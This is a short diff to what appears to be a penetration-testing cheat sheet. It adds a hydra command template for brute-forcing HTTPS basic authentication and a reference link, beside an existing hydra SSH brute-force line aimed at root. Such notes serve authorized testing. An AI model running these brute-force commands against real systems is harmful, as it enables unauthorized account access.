@@ -49,6 +49,10 @@
 	1. Bruteforcing password authentication enabled ssh service with hydra
 		hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
 		
+# Basic Authentication Brute
+
+	1. hydra -s 443 -l <username> -P <wordlist> -t 1 -f -vV <ip address> https-get <url directory, i.e. />
+		
 		 
 # Sqlmap
 
@@ -334,3 +338,4 @@ https://serverfault.com/questions/818058/get-remote-system-time-from-icmp-timest
 
 http://sketchymoose.blogspot.in/2012/01/beginning-web-pen-testing-icmp-scans.html
 https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
+http://xforeveryman.blogspot.in/2012/01/helper-brute-force-https-basic-access.html
